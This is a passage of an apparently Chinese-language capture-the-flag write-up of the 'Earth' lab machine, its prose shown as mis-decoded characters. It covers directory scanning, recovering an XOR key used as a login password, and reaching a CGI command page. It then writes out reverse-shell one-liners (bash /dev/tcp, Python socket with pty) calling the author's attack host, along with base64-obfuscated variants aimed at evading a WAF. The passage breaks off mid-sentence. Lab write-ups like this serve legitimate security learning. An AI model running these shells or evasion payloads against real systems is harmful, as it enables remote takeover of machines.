<p><strong>é˜²ç«å¢™æˆ–å®‰å…¨è§„åˆ™</strong>ï¼šæœåŠ¡å™¨çš„é˜²ç«å¢™æˆ–å®‰å…¨è§„åˆ™å¯èƒ½é…ç½®ä¸ºä»…æ¥å—æ¥è‡ªç‰¹å®šåŸŸåçš„è¯·æ±‚ï¼Œè€Œæ‹’ç»æ¥è‡ª IP åœ°å€çš„è¯·æ±‚ã€‚</p>
</li>
<li class="lvl-3">
<p><strong>æœåŠ¡å™¨è´Ÿè½½å‡è¡¡å™¨æˆ–åå‘ä»£ç†</strong>ï¼šå¦‚æœæœåŠ¡å™¨åç«¯ä½¿ç”¨äº†è´Ÿè½½å‡è¡¡å™¨æˆ–åå‘ä»£ç†ï¼Œå®ƒä»¬å¯èƒ½æ ¹æ®è¯·æ±‚çš„åŸŸåæ¥å†³å®šå¦‚ä½•è·¯ç”±è¯·æ±‚ï¼Œè€Œç›´æ¥ä½¿ç”¨ IP åœ°å€å¯èƒ½ä¸ä¼šç»è¿‡ç›¸åŒçš„è·¯ç”±é€»è¾‘ã€‚</p>
</li>
</ol>
<details class="info"><summary>åå‘ä»£ç†æ˜¯ä»€ä¹ˆé¬¼ï¼Ÿ</summary><div>
<p>å…ˆè¯´æ­£å‘ä»£ç†ï¼š</p>
<p>æ­£å¸¸ä»£ç†æœåŠ¡å™¨ï¼ˆä¸­é—´äººï¼‰ä¸€èˆ¬åœ¨å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨ä¹‹é—´ã€‚</p>
<blockquote>
<p>æµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰ ----(request)----&gt;    ä¸­é—´äººï¼ˆä»£ç†æœåŠ¡å™¨ï¼‰------&gt;  ç›®æ ‡æœåŠ¡å™¨    ----------&gt;   ä¸­é—´äººï¼ˆä»£ç†æœåŠ¡å™¨ï¼‰-----(response)----&gt; æµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰</p>
</blockquote>
<p>é»„ç‰›æŠ¢ç¥¨ï¼Œä¸­ä»‹å–æˆ¿ï¼Œä¸Šè¯¾ä¼ çº¸æ¡â€¦â€¦ éƒ½æ˜¯æ­£å‘ä»£ç†ã€‚<strong>æ­£å‘ä»£ç†ï¼Œå…¶å®æ˜¯ "ä»£ç†æœåŠ¡å™¨" ä»£ç†äº† "å®¢æˆ·ç«¯"ï¼Œå»å’Œ "ç›®æ ‡æœåŠ¡å™¨" è¿›è¡Œäº¤äº’ã€‚</strong></p>
<p>æ­£å‘ä»£ç†å¯ä»¥ï¼šçªç ´è®¿é—®é™åˆ¶ã€æé«˜è®¿é—®é€Ÿåº¦ã€éšè—å®¢æˆ·ç«¯çœŸå® IPã€‚</p>
<p><strong>é‚£ä¹ˆåå‘ä»£ç†å°±æ˜¯ï¼š</strong></p>
<blockquote>
<p>æµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰ ----(request)----&gt; ä¸­è½¬æœåŠ¡å™¨ ---(Request parsing)---&gt;  ç›®æ ‡æœåŠ¡å™¨    ---(response)----&gt; æµè§ˆå™¨ï¼ˆå®¢æˆ·ç«¯ï¼‰</p>
</blockquote>
<p>è€Œåå‘ä»£ç†æ˜¯åœ¨è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨ä¹‹åï¼Œ<strong>"ä»£ç†æœåŠ¡å™¨" ä»£è¡¨äº† "ç›®æ ‡æœåŠ¡å™¨"ï¼Œå»å’Œ "å®¢æˆ·ç«¯" è¿›è¡Œäº¤äº’ã€‚</strong></p>
<p>å› æ­¤åœ¨è¿™é‡Œè¯·æ±‚ ip åœ°å€ <code>192.168.81.131</code>  æœ‰å¯èƒ½ä¸æ˜¯æœåŠ¡å™¨çœŸå®çš„åœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ª nginx ä»£ç†æœåŠ¡å™¨æˆ–è€…æ˜¯ä¸€ä¸ª DNS è§£ææœåŠ¡å™¨ï¼Œè€Œæˆ‘ä»¬çš„åŸŸååˆ°è¾¾åå†è§£æåˆ°å¯¹åº”çš„æœåŠ¡ä¸Šï¼›ä¹Ÿæœ‰å¯èƒ½æ˜¯è™šæ‹Ÿä¸»æœºâ€¦â€¦</p>
</div></details>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/gui951753/article/details/83070180">ä¸ºä»€ä¹ˆåŸŸåèƒ½å¤Ÿè®¿é—®ç½‘ç«™ï¼Œè€Œç›´æ¥ä½¿ç”¨ IP ä¸å¯ä»¥_ä¸åšåŸŸåè§£æç›´æ¥ç”¨å…¬ç½‘ ip è®¿é—®å¯å¦ - CSDN åšå®¢</a></p>
<p>ä½†æ˜¯ â€”â€” è¿™é‡Œä¼¼ä¹æ˜¯ SSL è¯ä¹¦é—®é¢˜ï¼ˆç”¨ python è¯·æ±‚åŸŸååœ°å€å°±ä¼šæç¤ºè¯ä¹¦é—®é¢˜â€¦â€¦ï¼‰</p>
<h1 id="xoråˆæ¢"><a class="anchor" href="#xoråˆæ¢">#</a> XOR åˆæ¢</h1>
<p>æŠ˜è…¾å®Œï¼Œè®¿é—®ä¸€ä¸‹ç»ˆäºæ­£å¸¸äº†ï¼š</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503134311209.webp" alt="image-20240503134311209"></p>
<p>ä¸‹é¢æœ‰å¾ˆé•¿ä¸²çš„å­—ç¬¦è´´åœ¨è¿™é‡Œï¼Œåˆ’éƒ½åˆ’ä¸åˆ°å°½å¤´ã€‚ä¸€çœ¼æ‰«è¿‡å­—æ¯éƒ½æ˜¯åœ¨ a-fï¼Œæœ‰å¯èƒ½æ˜¯ 16 è¿›åˆ¶ï¼Œä½†æ˜¯è½¬ç å‡ºæ¥æ˜¯ä¹±ç ã€‚</p>
<figure class="highlight text"><figcaption data-lang="text"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</pre></td></tr></tbody></table></figure><figure class="highlight text"><figcaption data-lang="text"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</pre></td></tr></tbody></table></figure><figure class="highlight text"><figcaption data-lang="text"><span>é‡ç‚¹å…³æ³¨ï¼</span></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</pre></td></tr></tbody></table></figure><p>ç”¨ dirsearch æ‰«ç›®å½•å‘ç° admin è·¯ç”± 301ï¼Œä¼°è®¡è¢«é‡å®šå‘åˆ°éªŒè¯ç™»å½•ç•Œé¢äº†ã€‚</p>
<p>è®© sqlmap åœ¨åå°è·‘ç€å…ˆï¼Œæ¢å¦ä¸€ä¸ªåŸŸåæ‰¾æ‰¾çº¿ç´¢ã€‚ <code>http://terratest.earth.local/</code></p>
<p>æ‰“å¼€çš„ç•Œé¢æ˜¯ä¸€æ ·çš„ã€‚è¿˜æ˜¯æ‰«ä¸€æ‰«ç›®å½•çœ‹çœ‹ã€‚ç»“æœå’Œå‰é¢æ˜¯ä¸€æ ·çš„ï¼Œéš¾é“ä¸¤ä¸ªåŸŸåä¸‹æœåŠ¡éƒ½æ˜¯ä¸€æ ·çš„ï¼Ÿ</p>
<p>ç„¶åæˆ‘åˆç”¨ nmap æ‰«äº†ä¸¤ä¸ªåŸŸåï¼Œä¸¤ä¸ªåŸŸåéƒ½å¼€æ”¾äº† 22ï¼Œ80ï¼Œ443 ç«¯å£ã€‚äºæ˜¯æˆ‘æ”¹æˆç”¨ https åè®®è®¿é—®äº†ä¸€ä¸‹ã€‚</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503184626790.webp" alt="image-20240503184626790"></p>
<p>æµ‹è¯•ç«™ç‚¹è®©æˆ‘å¿½ç•¥ï¼Ÿæˆ‘ä¿¡ä½ ä¸ªé¬¼ä½ ä¸ªç³Ÿè€å¤´å­åå¾—å¾ˆã€‚æµ‹è¯•ç«™ç‚¹æ„Ÿè§‰æœ‰æºç æ³„éœ²çš„å¯èƒ½ã€‚å…ˆä¸Š dirsearchã€‚</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503185241920.webp" alt="image-20240503185241920"></p>
<p>æœç„¶æœ‰ç„æœºã€‚è™½ç„¶éƒ½æ˜¯ 403ï¼Œä½†æ˜¯ 200 çš„ robots.txt å¯ä»¥è®¿é—®åˆ°ã€‚</p>
<figure class="highlight bash"><figcaption data-lang="bash"><span>çœ‹çœ‹28ã€30è¡Œ</span></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>User-Agent: *</pre></td></tr><tr><td data-num="2"></td><td><pre>Disallow: /*.asp</pre></td></tr><tr><td data-num="3"></td><td><pre>Disallow: /*.aspx</pre></td></tr><tr><td data-num="4"></td><td><pre>Disallow: /*.bat</pre></td></tr><tr><td data-num="5"></td><td><pre>Disallow: /*.c</pre></td></tr><tr><td data-num="6"></td><td><pre>Disallow: /*.cfm</pre></td></tr><tr><td data-num="7"></td><td><pre>Disallow: /*.cgi</pre></td></tr><tr><td data-num="8"></td><td><pre>Disallow: /*.com</pre></td></tr><tr><td data-num="9"></td><td><pre>Disallow: /*.dll</pre></td></tr><tr><td data-num="10"></td><td><pre>Disallow: /*.exe</pre></td></tr><tr><td data-num="11"></td><td><pre>Disallow: /*.htm</pre></td></tr><tr><td data-num="12"></td><td><pre>Disallow: /*.html</pre></td></tr><tr><td data-num="13"></td><td><pre>Disallow: /*.inc</pre></td></tr><tr><td data-num="14"></td><td><pre>Disallow: /*.jhtml</pre></td></tr><tr><td data-num="15"></td><td><pre>Disallow: /*.jsa</pre></td></tr><tr><td data-num="16"></td><td><pre>Disallow: /*.json</pre></td></tr><tr><td data-num="17"></td><td><pre>Disallow: /*.jsp</pre></td></tr><tr><td data-num="18"></td><td><pre>Disallow: /*.log</pre></td></tr><tr><td data-num="19"></td><td><pre>Disallow: /*.mdb</pre></td></tr><tr><td data-num="20"></td><td><pre>Disallow: /*.nsf</pre></td></tr><tr><td data-num="21"></td><td><pre>Disallow: /*.php</pre></td></tr><tr><td data-num="22"></td><td><pre>Disallow: /*.phtml</pre></td></tr><tr><td data-num="23"></td><td><pre>Disallow: /*.pl</pre></td></tr><tr><td data-num="24"></td><td><pre>Disallow: /*.reg</pre></td></tr><tr><td data-num="25"></td><td><pre>Disallow: /*.sh</pre></td></tr><tr><td data-num="26"></td><td><pre>Disallow: /*.shtml</pre></td></tr><tr><td data-num="27"></td><td><pre>Disallow: /*.sql</pre></td></tr><tr class="marked"><td data-num="28"></td><td><pre>Disallow: /*.txt</pre></td></tr><tr><td data-num="29"></td><td><pre>Disallow: /*.xml</pre></td></tr><tr class="marked"><td data-num="30"></td><td><pre>Disallow: /testingnotes.*</pre></td></tr></tbody></table></figure><p>å†…å®¹å¾ˆå¤šï¼Œæœ€åæœ‰ä¸€ä¸ªæ–‡ä»¶åï¼ŒæŒ¨ä¸ªè¯•ä¸€ä¸‹åç¼€ï¼Œå‘ç° txt ä¸­æœ‰å†…å®¹ğŸ‘‡</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504001554684.webp" alt="image-20240504001554684"></p>
<p><mark>æ¶ˆæ¯é‡å·¨å¤§</mark>ï¼ŒXOR å…¶å®å°±æ˜¯å¼‚æˆ–è¿ç®—ï¼š<a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/roc1010/article/details/103227081">å¼‚æˆ– (XOR) è¿ç®—åŠ å¯† - CSDN åšå®¢</a></p>
<blockquote>
<p>æ˜æ–‡ XOR key ==&gt; å¯†æ–‡      å¯†æ–‡ XOR key ==&gt; æ˜æ–‡</p>
</blockquote>
<p>è®¿é—® testdata.txt å¾—åˆ°ä¸€ä¸²è‹±æ–‡ï¼Œå†™ä¸ªè„šæœ¬è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è¯•å‡ºæ¥ key æ˜¯ä»€ä¹ˆã€‚</p>
<p>ç”¨ç¬¬ä¸‰ä¸² 16 è¿›åˆ¶å­—ç¬¦è¯•ä¸€ä¸‹ï¼ˆå› ä¸ºæ˜æ–‡å¾ˆé•¿ï¼Œå¯†æ–‡åº”è¯¥ä¹Ÿå¾ˆé•¿ï¼‰</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504134242912.webp" alt="image-20240504134242912"></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token comment"># è„šæœ¬ï¼š</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">def</span> <span class="token function">find_key</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> ciphertext_hex<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    ciphertext_bytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>ciphertext_hex<span class="token punctuation">)</span>  <span class="token comment"># å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚ä¸²</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">for</span> char_plain<span class="token punctuation">,</span> char_cipher <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> ciphertext_bytes<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        key_byte <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char_plain<span class="token punctuation">)</span> <span class="token operator">^</span> char_cipher  <span class="token comment"># å¯¹åº”ä½ç½®çš„å­—ç¬¦è¿›è¡Œå¼‚æˆ–è¿ç®—</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>key_byte<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>plaintext <span class="token operator">=</span> <span class="token string">"According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago."</span></pre></td></tr><tr><td data-num="11"></td><td><pre>ciphertext_hex <span class="token operator">=</span> <span class="token string">"2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a"</span>  <span class="token comment"># è¿™é‡Œå¯†æ–‡æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²</span></pre></td></tr><tr><td data-num="12"></td><td><pre>key <span class="token operator">=</span> find_key<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> ciphertext_hex<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment"># OUTPUTï¼š</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token string">b'earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat'</span></pre></td></tr></tbody></table></figure><p><code>earthclimatechangebad4humans</code>  é‡å¤äº† 15 æ¬¡ã€‚ç”¨æ˜æ–‡å’Œå…¶ä»–ä¸¤ä¸²å¯†æ–‡å°è¯•äº†ä¸‹ï¼Œkey éƒ½æ˜¯å«æœ‰å­—ç¬¦æ‚ä¹±æ— ç« çš„ä¹±ç ï¼ˆæ²¡æœ‰ä¸å¯è§å­—ç¬¦ï¼‰ã€‚ç„¶åç”¨ <code>earthclimatechangebad4humans</code>  ä½œä¸ºå¯†é’¥å°è¯•è§£å¯†å¦å¤–ä¸¤ä¸²å¯†æ–‡ï¼Œå¾—åˆ°çš„ä¹Ÿè¿˜æ˜¯æ‚ä¹±çš„å­—ç¬¦ä¸²ï¼ˆå«æœ‰ä¸å¯è§å­—ç¬¦ï¼‰ï¼Œçœ‹ä¸å‡ºæ¥æœ‰ä»€ä¹ˆç‰¹æ®Šæ„ä¹‰ã€‚</p>
<h1 id="ç™½é€äº†ä¸€ä¸ªwebshell"><a class="anchor" href="#ç™½é€äº†ä¸€ä¸ªwebshell">#</a> ç™½é€äº†ä¸€ä¸ª webshell</h1>
<p>ä¸è¿‡æç¤ºä¸­ç»™äº†ç”¨æˆ·åï¼Œå°è¯•ç™»å½•ä¸€ä¸‹ã€‚ç”¨æˆ·åï¼š <code>terra </code> ï¼Œå¯†ç ï¼š <code>earthclimatechangebad4humans</code></p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504011702039.webp" alt="image-20240504011702039"></p>
<p>è¿™é‡Œå¯ä»¥è¿è¡Œ CGI è„šæœ¬ï¼Œäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯ CGI å…ˆã€‚</p>
<blockquote>
<p>CGI æ˜¯ä¸€ç§æ ‡å‡†çš„ã€å¹³å°æ— å…³çš„ã€åè®®æ— å…³çš„æ¥å£ï¼Œç”¨äºå°† Web æœåŠ¡å™¨ä¸ Web åº”ç”¨ç¨‹åºæˆ–è„šæœ¬è¿æ¥èµ·æ¥ã€‚CGI å…è®¸ Web æœåŠ¡å™¨è°ƒç”¨å¤–éƒ¨ç¨‹åºæ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¹¶å°†è¾“å‡ºè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p>
</blockquote>
<p>è¯´äººè¯ï¼šæœåŠ¡å™¨ä¸€ä¸ªè„šæœ¬ï¼Œè·å–æ•°æ®å¤„ç†åè¿”å›ç»“æœç»™æµè§ˆå™¨ã€‚</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>æ•°æ®ä»å“ªæ¥ï¼ŸENV ç¯å¢ƒå˜é‡ï¼Œæˆ–è€…æ ‡å‡†è¾“å…¥ï¼ˆSTDINï¼‰ï¼›</p>
</li>
<li class="lvl-2">
<p>è„šæœ¬ç”¨ä»€ä¹ˆè¯­è¨€ï¼Ÿå¯ä»¥æ˜¯ Python è„šæœ¬ï¼ŒPERL è„šæœ¬ï¼ŒSHELL è„šæœ¬ï¼ŒC æˆ–è€… C++ ç¨‹åºç­‰ã€‚</p>
</li>
<li class="lvl-2">
<p>ç»“æœæ€ä¹ˆè¿”å›ï¼Ÿè¾“å‡ºæ•°æ®å‘é€åˆ°æ ‡å‡†è¾“å‡ºï¼ˆSTDOUTï¼‰ã€‚</p>
</li>
</ul>
<p><mark><strong>ç‰¹åˆ«ä¹‹å¤„ï¼š</strong></mark></p>
<ol>
<li class="lvl-3">
<p>æ•°æ®è¾“å…¥</p>
</li>
</ol>
<p>** ç¯å¢ƒå˜é‡è¯»å–ï¼š** å¯¹äº CGI ç¨‹åºæ¥è¯´ï¼Œå®ƒç»§æ‰¿äº†ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ã€‚CGI ç¯å¢ƒå˜é‡åœ¨ CGI ç¨‹åºå¯åŠ¨æ—¶åˆå§‹åŒ–ï¼Œåœ¨ç»“æŸæ—¶é”€æ¯ã€‚å½“ä¸€ä¸ª CGI ç¨‹åºä¸æ˜¯è¢« HTTP æœåŠ¡å™¨è°ƒç”¨æ—¶ï¼Œå®ƒçš„ç¯å¢ƒå˜é‡å‡ ä¹æ˜¯ç³»ç»Ÿç¯å¢ƒå˜é‡çš„å¤åˆ¶ã€‚å½“è¿™ä¸ª CGI ç¨‹åºè¢« HTTP æœåŠ¡å™¨è°ƒç”¨æ—¶ï¼Œå®ƒçš„ç¯å¢ƒå˜é‡å°±ä¼šå¤šäº†ä»¥ä¸‹å…³äº HTTP æœåŠ¡å™¨ã€å®¢æˆ·ç«¯ã€CGI ä¼ è¾“è¿‡ç¨‹ç­‰é¡¹ç›®ã€‚</p>
<p>** æµè§ˆå™¨æ•°æ®å‘é€ï¼š** è·å–çš„æ˜¯æµè§ˆå™¨ url ç¼–ç åçš„åŸå§‹æ•°æ®ï¼Œè‹¥è¦ä½¿ç”¨åˆ™éœ€è¦ CGI æ‰‹åŠ¨è§£ç è°ƒç”¨ã€‚</p>
<ol start="2">
<li class="lvl-3">
<p>æ•°æ®è¾“å‡º</p>
</li>
</ol>
<p>CGI ç¨‹åºå¦‚ä½•å°†ä¿¡æ¯å¤„ç†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ï¼Ÿè¿™å®é™…ä¸Šæ˜¯ CGI æ ¼å¼åŒ–è¾“å‡ºã€‚</p>
<p>åœ¨ CGI ç¨‹åºä¸­çš„æ ‡å‡†è¾“å‡º stdout æ˜¯ç»è¿‡é‡å®šä¹‰äº†çš„ï¼Œå®ƒå¹¶æ²¡æœ‰åœ¨æœåŠ¡å™¨ä¸Šäº§ç”Ÿä»»ä½•çš„è¾“å‡ºå†…å®¹ï¼Œè€Œæ˜¯è¢«é‡å®šå‘åˆ°å®¢æˆ·æµè§ˆå™¨ï¼Œè¿™ä¸å®ƒæ˜¯ç”± Cï¼Œè¿˜æ˜¯ Perl æˆ– Python å®ç°æ— å…³ã€‚</p>
<p>CGI åè®®è¿˜æœ‰ä¸€ç³»åˆ—è§„èŒƒï¼Œè¯¦è§£æˆ³ğŸ‘‰çŸ¥è¯†ä¼ é€é—¨ï¼š<a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/weixin_39609623/article/details/86312439">WEB ä¹‹ CGI----CGI è¯¦è§£_cgi web-CSDN åšå®¢</a></p>
<p>çœ‹å®Œè¿™äº›åº”è¯¥éƒ½èƒ½å‘ç°è¿™æ˜¯<span class="spoiler" title="ä½ çŸ¥é“å¾—å¤ªå¤šäº†"> hacker çš„æœ€çˆ±</span>äº†ã€‚è¿™ä¸ªæ¡†æ¡†ç›´æ¥å¯ä»¥å‘½ä»¤æ‰§è¡Œã€‚</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504015919921.webp" alt="image-20240504015919921"></p>
<p>ç›´æ¥å¼¹ä¸ª shell åˆ° kali ä¸Šï¼Œå‡†å¤‡åç»­çš„ææƒã€‚</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/192.168.81.129/9999 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>    <span class="token comment">#  CGI é¶æœºæ‰§è¡Œå¼¹ shell</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">9999</span>                                   <span class="token comment"># kali ç›‘å¬ç«¯å£</span></pre></td></tr></tbody></table></figure><p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504020245279.webp" alt="image-20240504020245279"></p>
<p>æˆ‘å˜ä¸ªè±†ï¼ŒForbidden äº†â€¦â€¦ï¼ˆå¿ƒç†æ€’å–·ä¸€ä¸‡å¥ä½†æ˜¯è¡¨é¢æ€‚å¾—ä¸€æ‰¹ï¼‰ã€‚ç›´æ¥å¼¹ä¸è¡Œç»•ä¸€ä¸‹ã€‚</p>
<p>åå¼¹ shell payload å¤§å…¨ï¼š<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.revshells.com/">Online - Reverse Shell Generator (revshells.com)</a></p>
<p>ç¡¬çš„ä¸è¡Œæ¥è½¯çš„ï¼Œç”¨è„šæœ¬å¼¹ã€‚å‰é¢å·²ç»çŸ¥é“äº†é¶æœºæœ‰ python ç¯å¢ƒçš„ã€‚</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>python3 <span class="token parameter variable">-c</span> <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.81.129",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'</span></pre></td></tr></tbody></table></figure><p><span class="spoiler" title="ä½ çŸ¥é“å¾—å¤ªå¤šäº†">æ·¦</span>è¿™é‡Œè¿˜æœ‰ä¸ªé™åˆ¶ï¼Œå¦‚æœæ˜¯ç”¨ hackbar åœ¨ POST ä¸­è¾“å…¥ commandï¼Œç”±äºç½‘é¡µå­˜åœ¨ csrf çš„ token æ ¡éªŒï¼Œå¯¼è‡´ execute æ—¶ç›´æ¥å¼¹å‡º 403Forbiddenï¼Œè€Œç›´æ¥åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥å‘ç°æœ‰é•¿åº¦ 100 çš„é™åˆ¶ã€‚äºæ˜¯ä¹Ÿè¡Œä¸é€šã€‚</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>python <span class="token parameter variable">-c</span> exec<span class="token punctuation">(</span><span class="token string">'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjgxLjEyOS85OTk5IDA+JjE='</span>.decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">))</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token punctuation">{</span>echo,c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC44MS4xMjkvOTk5OSAwPiYx<span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">{</span>base64,-d<span class="token punctuation">}</span><span class="token operator">|</span><span class="token punctuation">{</span>bash,-i<span class="token punctuation">}</span></pre></td></tr></tbody></table></figure><p>è¿™ä¸¤ä¸ª payload éƒ½æ­£å¸¸æ‰§è¡Œäº†ä½†æ˜¯å´æ²¡æœ‰å¼¹ shell åˆ° kali ä¸Šï¼Œæˆ‘çŒœæµ‹è¿™é‡Œçš„ waf åªæ˜¯æ­£åˆ™åŒ¹é…äº† ip çš„æ ¼å¼ï¼Œè¯•ä¸€ä¸‹ç”¨è¿›åˆ¶ç»•è¿‡ï¼š</p>
